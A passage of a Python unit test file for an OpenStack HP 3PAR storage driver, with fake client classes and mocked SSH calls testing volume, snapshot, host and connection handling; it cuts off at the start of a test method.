{'diskPatterns': [{'diskType': 2}]},\n                            'incrementMiB': 8192},\n               'SAUsage': {'rawTotalMiB': 24576,\n                           'rawUsedMiB': 768,\n                           'totalMiB': 8192,\n                           'usedMiB': 256},\n               'SDGrowth': {'LDLayout': {'RAIDType': 4,\n                            'diskPatterns': [{'diskType': 2}]},\n                            'incrementMiB': 32768},\n               'SDUsage': {'rawTotalMiB': 49152,\n                           'rawUsedMiB': 1023,\n                           'totalMiB': 36864,\n                           'usedMiB': 768},\n               'UsrUsage': {'rawTotalMiB': 57344,\n                            'rawUsedMiB': 43349,\n                            'totalMiB': 43008,\n                            'usedMiB': 32512},\n               'additionalStates': [],\n               'degradedStates': [],\n               'domain': HP3PAR_DOMAIN,\n               'failedStates': [],\n               'id': 1,\n               'name': name,\n               'numFPVVs': 2,\n               'numTPVVs': 0,\n               'state': 1,\n               'uuid': '29c214aa-62b9-41c8-b198-000000000000'}\n\n        new_cpg = cpg.copy()\n        new_cpg.update(optional)\n        self.cpgs.append(new_cpg)\n\n    def getCPGs(self):\n        return self.cpgs\n\n    def getCPG(self, name):\n        if self.cpgs:\n            for cpg in self.cpgs:\n                if cpg['name'] == name:\n                    return cpg\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"CPG '%s' was not found\" % name}\n        raise hpexceptions.HTTPNotFound(msg)\n\n    def deleteCPG(self, name):\n        cpg = self.getCPG(name)\n        self.cpgs.remove(cpg)\n\n    def createVLUN(self, volumeName, lun, hostname=None,\n                   portPos=None, noVcn=None,\n                   overrideLowerPriority=None):\n\n        vlun = {'active': False,\n                'failedPathInterval': 0,\n                'failedPathPol': 1,\n                'hostname': hostname,\n                'lun': lun,\n                'multipathing': 1,\n                'portPos': portPos,\n                'type': 4,\n                'volumeName': volumeName,\n                'volumeWWN': '50002AC00077383D'}\n        self.vluns.append(vlun)\n        return None\n\n    def deleteVLUN(self, name, lunID, hostname=None, port=None):\n        vlun = self.getVLUN(name)\n        self.vluns.remove(vlun)\n\n    def getVLUNs(self):\n        return self.vluns\n\n    def getVLUN(self, volumeName):\n        for vlun in self.vluns:\n            if vlun['volumeName'] == volumeName:\n                return vlun\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"VLUN '%s' was not found\" % volumeName}\n        raise hpexceptions.HTTPNotFound(msg)\n\n\nclass HP3PARBaseDriver():\n\n    VOLUME_ID = \"d03338a9-9115-48a3-8dfc-35cdfcdc15a7\"\n    CLONE_ID = \"d03338a9-9115-48a3-8dfc-000000000000\"\n    VOLUME_NAME = \"volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7\"\n    SNAPSHOT_ID = \"2f823bdc-e36e-4dc8-bd15-de1c7a28ff31\"\n    SNAPSHOT_NAME = \"snapshot-2f823bdc-e36e-4dc8-bd15-de1c7a28ff31\"\n    VOLUME_3PAR_NAME = \"osv-0DM4qZEVSKON-DXN-NwVpw\"\n    SNAPSHOT_3PAR_NAME = \"oss-L4I73ONuTci9Fd4ceij-MQ\"\n    FAKE_HOST = \"fakehost\"\n    USER_ID = '2689d9a913974c008b1d859013f23607'\n    PROJECT_ID = 'fac88235b9d64685a3530f73e490348f'\n    VOLUME_ID_SNAP = '761fc5e5-5191-4ec7-aeba-33e36de44156'\n    FAKE_DESC = 'test description name'\n    FAKE_FC_PORTS = ['0987654321234', '123456789000987']\n    QOS = {'qos:maxIOPS': '1000', 'qos:maxBWS': '50'}\n    VVS_NAME = \"myvvs\"\n    FAKE_ISCSI_PORTS = {'1.1.1.2': {'nsp': '8:1:1',\n                                    'iqn': ('iqn.2000-05.com.3pardata:'\n                                            '21810002ac00383d'),\n                                    'ip_port': '3262'}}\n\n    volume = {'name': VOLUME_NAME,\n              'id': VOLUME_ID,\n              'display_name': 'Foo Volume',\n              'size': 2,\n              'host': FAKE_HOST,\n              'volume_type': None,\n              'volume_type_id': None}\n\n    volume_qos = {'name': VOLUME_NAME,\n                  'id': VOLUME_ID,\n                  'display_name': 'Foo Volume',\n                  'size': 2,\n                  'host': FAKE_HOST,\n                  'volume_type': None,\n                  'volume_type_id': 'gold'}\n\n    snapshot = {'name': SNAPSHOT_NAME,\n                'id': SNAPSHOT_ID,\n                'user_id': USER_ID,\n                'project_id': PROJECT_ID,\n                'volume_id': VOLUME_ID_SNAP,\n                'volume_name': VOLUME_NAME,\n                'status': 'creating',\n                'progress': '0%',\n                'volume_size': 2,\n                'display_name': 'fakesnap',\n                'display_description': FAKE_DESC}\n\n    connector = {'ip': '10.0.0.2',\n                 'initiator': 'iqn.1993-08.org.debian:01:222',\n                 'wwpns': [\"123456789012345\", \"123456789054321\"],\n                 'wwnns': [\"223456789012345\", \"223456789054321\"],\n                 'host': 'fakehost'}\n\n    volume_type = {'name': 'gold',\n                   'deleted': False,\n                   'updated_at': None,\n                   'extra_specs': {'qos:maxBWS': '50',\n                                   'qos:maxIOPS': '1000'},\n                   'deleted_at': None,\n                   'id': 'gold'}\n\n    def setup_configuration(self):\n        configuration = mox.MockObject(conf.Configuration)\n        configuration.hp3par_debug = False\n        configuration.hp3par_username = 'testUser'\n        configuration.hp3par_password = 'testPassword'\n        configuration.hp3par_api_url = 'https://1.1.1.1/api/v1'\n        configuration.hp3par_domain = HP3PAR_DOMAIN\n        configuration.hp3par_cpg = HP3PAR_CPG\n        configuration.hp3par_cpg_snap = HP3PAR_CPG_SNAP\n        configuration.iscsi_ip_address = '1.1.1.2'\n        configuration.iscsi_port = '1234'\n        configuration.san_ip = '2.2.2.2'\n        configuration.san_login = 'test'\n        configuration.san_password = 'test'\n        configuration.hp3par_snapshot_expiration = \"\"\n        configuration.hp3par_snapshot_retention = \"\"\n        configuration.hp3par_iscsi_ips = []\n        return configuration\n\n    def setup_fakes(self):\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_get_3par_host\",\n                       self.fake_get_3par_host)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_delete_3par_host\",\n                       self.fake_delete_3par_host)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_3par_vlun\",\n                       self.fake_create_3par_vlun)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_ports\",\n                       self.fake_get_ports)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n\n    def clear_mox(self):\n        self.mox.ResetAll()\n        self.stubs.UnsetAll()\n\n    def fake_create_client(self):\n        return FakeHP3ParClient(self.driver.configuration.hp3par_api_url)\n\n    def fake_get_cpg(self, volume, allowSnap=False):\n        return HP3PAR_CPG\n\n    def fake_set_connections(self):\n        return\n\n    def fake_get_domain(self, cpg):\n        return HP3PAR_DOMAIN\n\n    def fake_extend_volume(self, volume, new_size):\n        vol = self.driver.common.client.getVolume(volume['name'])\n        old_size = vol['sizeMiB']\n        option = {'comment': vol['comment'], 'snapCPG': vol['snapCPG']}\n        self.driver.common.client.deleteVolume(volume['name'])\n        self.driver.common.client.createVolume(vol['name'],\n                                               vol['userCPG'],\n                                               new_size, option)\n\n    def fake_get_3par_host(self, hostname):\n        if hostname not in self._hosts:\n            msg = {'code': 'NON_EXISTENT_HOST',\n                   'desc': \"HOST '%s' was not found\" % hostname}\n            raise hpexceptions.HTTPNotFound(msg)\n        else:\n            return self._hosts[hostname]\n\n    def fake_delete_3par_host(self, hostname):\n        if hostname not in self._hosts:\n            msg = {'code': 'NON_EXISTENT_HOST',\n                   'desc': \"HOST '%s' was not found\" % hostname}\n            raise hpexceptions.HTTPNotFound(msg)\n        else:\n            del self._hosts[hostname]\n\n    def fake_create_3par_vlun(self, volume, hostname):\n        self.driver.common.client.createVLUN(volume, 19, hostname)\n\n    def fake_get_ports(self):\n        return {'FC': self.FAKE_FC_PORTS, 'iSCSI': self.FAKE_ISCSI_PORTS}\n\n    def fake_get_volume_type(self, type_id):\n        return self.volume_type\n\n    def fake_get_qos_by_volume_type(self, volume_type):\n        return self.QOS\n\n    def fake_add_volume_to_volume_set(self, volume, volume_name,\n                                      cpg, vvs_name, qos):\n        return volume\n\n    def fake_copy_volume(self, src_name, dest_name, cpg=None,\n                         snap_cpg=None, tpvv=True):\n        pass\n\n    def fake_get_volume_stats(self, vol_name):\n        return \"normal\"\n\n    def fake_get_volume_settings_from_type(self, volume):\n        return {'cpg': HP3PAR_CPG,\n                'snap_cpg': HP3PAR_CPG_SNAP,\n                'vvs_name': self.VVS_NAME,\n                'qos': self.QOS,\n                'tpvv': True,\n                'volume_type': self.volume_type}\n\n    def fake_get_volume_settings_from_type_noqos(self, volume):\n        return {'cpg': HP3PAR_CPG,\n                'snap_cpg': HP3PAR_CPG_SNAP,\n                'vvs_name': None,\n                'qos': None,\n                'tpvv': True,\n                'volume_type': None}\n\n    def test_create_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type_noqos)\n        self.driver.create_volume(self.volume)\n        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)\n\n    def test_create_volume_qos(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_add_volume_to_volume_set\",\n                       self.fake_add_volume_to_volume_set)\n        self.driver.create_volume(self.volume_qos)\n        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n\n        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)\n        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))\n\n    def test_delete_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.driver.delete_volume(self.volume)\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVolume,\n                          self.VOLUME_ID)\n\n    def test_create_cloned_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"get_volume_settings_from_type\",\n                       self.fake_get_volume_settings_from_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_copy_volume\",\n                       self.fake_copy_volume)\n        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,\n                  'id': HP3PARBaseDriver.CLONE_ID,\n                  'display_name': 'Foo Volume',\n                  'size': 2,\n                  'host': HP3PARBaseDriver.FAKE_HOST,\n                  'source_volid': HP3PARBaseDriver.VOLUME_ID}\n        src_vref = {}\n        model_update = self.driver.create_cloned_volume(volume, src_vref)\n        self.assertTrue(model_update is not None)\n\n    def test_create_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n        self.driver.create_snapshot(self.snapshot)\n\n        # check to see if the snapshot was created\n        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)\n\n    def test_delete_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n\n        self.driver.create_snapshot(self.snapshot)\n        #make sure it exists first\n        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)\n        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)\n        self.driver.delete_snapshot(self.snapshot)\n\n        # the snapshot should be deleted now\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVolume,\n                          self.SNAPSHOT_3PAR_NAME)\n\n    def test_create_volume_from_snapshot(self):\n        self.flags(lock_path=self.tempdir)\n        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)\n\n        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)\n\n        volume = self.volume.copy()\n        volume['size'] = 1\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.create_volume_from_snapshot,\n                          volume, self.snapshot)\n\n    def test_create_volume_from_snapshot_qos(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_get_volume_type\",\n                       self.fake_get_volume_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_get_qos_by_volume_type\",\n                       self.fake_get_qos_by_volume_type)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,\n                       \"_add_volume_to_volume_set\",\n                       self.fake_add_volume_to_volume_set)\n        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)\n        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)\n        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)\n        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))\n\n        volume = self.volume.copy()\n        volume['size'] = 1\n        self.assertRaises(exception.InvalidInput,\n                          self.driver.create_volume_from_snapshot,\n                          volume, self.snapshot)\n\n    def test_terminate_connection(self):\n        self.flags(lock_path=self.tempdir)\n        #setup the connections\n        self.driver.initialize_connection(self.volume, self.connector)\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)\n        self.driver.terminate_connection(self.volume, self.connector,\n                                         force=True)\n        # vlun should be gone.\n        self.assertRaises(hpexceptions.HTTPNotFound,\n                          self.driver.common.client.getVLUN,\n                          self.VOLUME_3PAR_NAME)\n\n    def test_extend_volume(self):\n        self.flags(lock_path=self.tempdir)\n        self.stubs.UnsetAll()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"extend_volume\",\n                       self.fake_extend_volume)\n        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}\n        self.driver.common.client.createVolume(self.volume['name'],\n                                               HP3PAR_CPG,\n                                               self.volume['size'],\n                                               option)\n        old_size = self.volume['size']\n        volume = self.driver.common.client.getVolume(self.volume['name'])\n        self.driver.extend_volume(volume, str(old_size + 1))\n        vol = self.driver.common.client.getVolume(self.volume['name'])\n        self.assertEqual(vol['sizeMiB'], str(old_size + 1))\n\n\nclass TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):\n\n    _hosts = {}\n\n    def setUp(self):\n        self.tempdir = tempfile.mkdtemp()\n        super(TestHP3PARFCDriver, self).setUp()\n        self.setup_driver(self.setup_configuration())\n        self.setup_fakes()\n\n    def setup_fakes(self):\n        super(TestHP3PARFCDriver, self).setup_fakes()\n        self.stubs.Set(hpfcdriver.HP3PARFCDriver,\n                       \"_create_3par_fibrechan_host\",\n                       self.fake_create_3par_fibrechan_host)\n\n    def tearDown(self):\n        shutil.rmtree(self.tempdir)\n        super(TestHP3PARFCDriver, self).tearDown()\n\n    def setup_driver(self, configuration):\n        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.driver.do_setup(None)\n\n    def fake_create_3par_fibrechan_host(self, hostname, wwn,\n                                        domain, persona_id):\n        host = {'FCPaths': [{'driverVersion': None,\n                             'firmwareVersion': None,\n                             'hostSpeed': 0,\n                             'model': None,\n                             'portPos': {'cardPort': 1, 'node': 1,\n                                         'slot': 2},\n                             'vendor': None,\n                             'wwn': wwn[0]},\n                            {'driverVersion': None,\n                             'firmwareVersion': None,\n                             'hostSpeed': 0,\n                             'model': None,\n                             'portPos': {'cardPort': 1, 'node': 0,\n                                         'slot': 2},\n                             'vendor': None,\n                             'wwn': wwn[1]}],\n                'descriptors': None,\n                'domain': domain,\n                'iSCSIPaths': [],\n                'id': 11,\n                'name': hostname}\n        self._hosts[hostname] = host\n        self.properties = {'data':\n                          {'target_discovered': True,\n                           'target_lun': 186,\n                           'target_portal': '1.1.1.2:1234'},\n                           'driver_volume_type': 'fibre_channel'}\n        return hostname\n\n    def test_initialize_connection(self):\n        self.flags(lock_path=self.tempdir)\n        result = self.driver.initialize_connection(self.volume, self.connector)\n        self.assertEqual(result['driver_volume_type'], 'fibre_channel')\n\n        # we should have a host and a vlun now.\n        host = self.fake_get_3par_host(self.FAKE_HOST)\n        self.assertEquals(self.FAKE_HOST, host['name'])\n        self.assertEquals(HP3PAR_DOMAIN, host['domain'])\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n\n        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])\n        self.assertEquals(self.FAKE_HOST, vlun['hostname'])\n\n    def test_get_volume_stats(self):\n        self.flags(lock_path=self.tempdir)\n\n        def fake_safe_get(*args):\n            return \"HP3PARFCDriver\"\n\n        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'FC')\n        self.assertEquals(stats['total_capacity_gb'], 'infinite')\n        self.assertEquals(stats['free_capacity_gb'], 'infinite')\n\n        #modify the CPG to have a limit\n        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)\n        options = {'SDGrowth': {'limitMiB': 8192}}\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, options)\n\n        const = 0.0009765625\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'FC')\n        total_capacity_gb = 8192 * const\n        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)\n        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)\n        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, {})\n\n    def test_create_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost', '123456789012345',\n                            '123456789054321'])\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_create_invalid_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost', '123456789012345',\n                            '123456789054321'])\n        create_host_ret = pack(CLI_CR +\n                               'already used by host fakehost.foo (19)')\n        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])\n\n        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']\n        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n\n        self.assertEquals(host['name'], 'fakehost.foo')\n\n    def test_create_modify_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])\n\n        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',\n                           '123456789054321']\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n\nclass TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):\n\n    TARGET_IQN = \"iqn.2000-05.com.3pardata:21810002ac00383d\"\n\n    _hosts = {}\n\n    def setUp(self):\n        self.tempdir = tempfile.mkdtemp()\n        super(TestHP3PARISCSIDriver, self).setUp()\n        self.setup_driver(self.setup_configuration())\n        self.setup_fakes()\n\n    def setup_fakes(self):\n        super(TestHP3PARISCSIDriver, self).setup_fakes()\n\n        self.stubs.Set(hpdriver.HP3PARISCSIDriver, \"_create_3par_iscsi_host\",\n                       self.fake_create_3par_iscsi_host)\n\n        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'\n        self.properties = {'data':\n                          {'target_discovered': True,\n                           'target_iqn': self.TARGET_IQN,\n                           'target_lun': 186,\n                           'target_portal': '1.1.1.2:1234'},\n                           'driver_volume_type': 'iscsi'}\n\n    def tearDown(self):\n        shutil.rmtree(self.tempdir)\n        self._hosts = {}\n        super(TestHP3PARISCSIDriver, self).tearDown()\n\n    def setup_driver(self, configuration, set_up_fakes=True):\n        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_create_client\",\n                       self.fake_create_client)\n\n        if set_up_fakes:\n            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_ports\",\n                           self.fake_get_ports)\n\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_set_connections\",\n                       self.fake_set_connections)\n        self.driver.do_setup(None)\n\n    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,\n                                    domain, persona_id):\n        host = {'FCPaths': [],\n                'descriptors': None,\n                'domain': domain,\n                'iSCSIPaths': [{'driverVersion': None,\n                                'firmwareVersion': None,\n                                'hostSpeed': 0,\n                                'ipAddr': '10.10.221.59',\n                                'model': None,\n                                'name': iscsi_iqn,\n                                'portPos': {'cardPort': 1, 'node': 1,\n                                            'slot': 8},\n                                'vendor': None}],\n                'id': 11,\n                'name': hostname}\n        self._hosts[hostname] = host\n        return hostname\n\n    def test_initialize_connection(self):\n        self.flags(lock_path=self.tempdir)\n        result = self.driver.initialize_connection(self.volume, self.connector)\n        self.assertEqual(result['driver_volume_type'], 'iscsi')\n        self.assertEqual(result['data']['target_iqn'],\n                         self.properties['data']['target_iqn'])\n        self.assertEqual(result['data']['target_portal'],\n                         self.properties['data']['target_portal'])\n        self.assertEqual(result['data']['target_discovered'],\n                         self.properties['data']['target_discovered'])\n\n        # we should have a host and a vlun now.\n        host = self.fake_get_3par_host(self.FAKE_HOST)\n        self.assertEquals(self.FAKE_HOST, host['name'])\n        self.assertEquals(HP3PAR_DOMAIN, host['domain'])\n        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)\n\n        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])\n        self.assertEquals(self.FAKE_HOST, vlun['hostname'])\n\n    def test_get_volume_stats(self):\n        self.flags(lock_path=self.tempdir)\n\n        def fake_safe_get(*args):\n            return \"HP3PARFCDriver\"\n\n        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'iSCSI')\n        self.assertEquals(stats['total_capacity_gb'], 'infinite')\n        self.assertEquals(stats['free_capacity_gb'], 'infinite')\n\n        #modify the CPG to have a limit\n        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)\n        options = {'SDGrowth': {'limitMiB': 8192}}\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, options)\n\n        const = 0.0009765625\n        stats = self.driver.get_volume_stats(True)\n        self.assertEquals(stats['storage_protocol'], 'iSCSI')\n        total_capacity_gb = 8192 * const\n        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)\n        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)\n        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)\n        self.driver.common.client.deleteCPG(HP3PAR_CPG)\n        self.driver.common.client.createCPG(HP3PAR_CPG, {})\n\n    def test_create_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',\n                            ('OpenStack',), 'fakehost',\n                            'iqn.1993-08.org.debian:01:222'])\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_create_invalid_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])\n\n        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',\n                           ('OpenStack',), 'fakehost',\n                            'iqn.1993-08.org.debian:01:222'])\n        in_use_ret = pack('\\r\\nalready used by host fakehost.foo ')\n        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])\n\n        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']\n        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n\n        self.assertEquals(host['name'], 'fakehost.foo')\n\n    def test_create_modify_host(self):\n        self.flags(lock_path=self.tempdir)\n\n        #record\n        self.clear_mox()\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_cpg\",\n                       self.fake_get_cpg)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"get_domain\",\n                       self.fake_get_domain)\n        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)\n        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, \"_run_ssh\", _run_ssh)\n\n        show_host_cmd = ['showhost', '-verbose', 'fakehost']\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])\n\n        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',\n                           'iqn.1993-08.org.debian:01:222']\n        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])\n        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])\n        self.mox.ReplayAll()\n\n        host = self.driver._create_host(self.volume, self.connector)\n        self.assertEqual(host['name'], self.FAKE_HOST)\n\n    def test_get_ports(self):\n        